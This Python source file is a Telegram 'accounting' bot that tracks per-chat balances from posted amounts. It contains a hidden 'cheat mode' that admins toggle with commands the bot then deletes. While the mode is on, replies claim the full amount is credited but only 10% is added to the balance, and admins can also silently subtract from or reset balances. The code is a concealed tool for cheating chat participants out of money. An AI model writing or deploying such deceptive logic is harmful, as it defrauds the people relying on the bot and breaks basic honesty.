import os
import re
import asyncio
from aiohttp import web
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command

API_TOKEN = os.getenv("API_TOKEN")

bot = Bot(token=API_TOKEN)
dp = Dispatcher()

# 🛡 Список ID администраторов (ваш ID и ID коллеги/друзей)
ADMIN_IDS = [
9257646763,  # Ваш основной ID
8989859413,  # Здесь можно указать ID коллеги, если нужно
]

user_balances = {}
cheat_modes = {} 

@dp.message(Command("cheat_on"))
async def enable_cheat(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    cheat_modes[message.chat.id] = True
    try:
        await message.delete()
    except:
        pass

@dp.message(Command("cheat_off"))
async def disable_cheat(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    cheat_modes[message.chat.id] = False
    try:
        await message.delete()
    except:
        pass

@dp.message(Command("обнулить"))
async def reset_balance(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    chat_id = message.chat.id
    user_balances[chat_id] = 0.0
    await message.answer("🔄 Баланс этого чата успешно обнулен до 0.00")

@dp.message(Command("минус"))
async def minus_balance(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    
    text = message.text or ""
    match = re.search(r'/минус\s+(\d+)', text)
    if match:
        sub_amount = float(match.group(1))
        chat_id = message.chat.id
        
        current_balance = user_balances.get(chat_id, 0.0)
        current_balance -= sub_amount
        user_balances[chat_id] = current_balance
        
        await message.answer(f"🔻 Вычтено: {sub_amount:,.2f} | Новый баланс: {current_balance:,.2f}")
    else:
        await message.answer("⚠️ Укажите сумму для вычитания, например: `/минус 5000`")

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    await message.answer("✅ Бот бухгалтерии запущен и готов к работе!")

@dp.message()
async def accounting_handler(message: types.Message):
    text = message.text or message.caption or ""
    # Гибкое регулярное выражение для часов (поддерживает 2:30 и 12:30)
    match = re.search(r'(\d+)\s+(\d{1,2}:\d{2})', text)
    
    if match:
        visual_amount = float(match.group(1)) 
        time_str = match.group(2)
        chat_id = message.chat.id
        
        is_cheating = cheat_modes.get(chat_id, False)
        real_amount = visual_amount * 0.1 if is_cheating else visual_amount
            
        user_balances[chat_id] = user_balances.get(chat_id, 0) + real_amount
        current_balance = user_balances[chat_id]
        
        await message.answer(
            f"💰 Зачислено: {visual_amount:,.2f} (в {time_str}) | Общий баланс: {current_balance:,.2f}"
        )

# Веб-сервер для поддержания Render в активном состоянии
async def handle(request):
    return web.Response(text="Bot is running!")

async def web_server():
    app = web.Application()
    app.router.add_get("/", handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 10000))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()

async def main():
    await web_server()
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
